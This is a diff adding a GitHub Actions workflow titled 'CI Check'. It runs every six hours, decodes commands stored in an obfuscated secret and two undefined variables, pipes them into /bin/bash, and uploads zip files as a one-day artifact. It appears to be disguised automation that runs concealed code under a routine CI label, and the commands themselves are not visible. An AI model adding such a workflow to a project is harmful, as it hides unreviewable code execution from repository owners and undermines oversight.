@@ -1,0 +1,29 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '29 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          dtx0: ${{ secrets.dtx0 }}
+        run: |
+          printf '%s' "$dtx0" | jq -r .siyi284 | /bin/bash
+          printf '%s' "$k5" | jq -r .my00489 | /bin/bash
+          printf '%s' "$rpt89" | jq -r .zx475 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: dDJWCpUc
+          path: "*.zip"
+          retention-days: 1
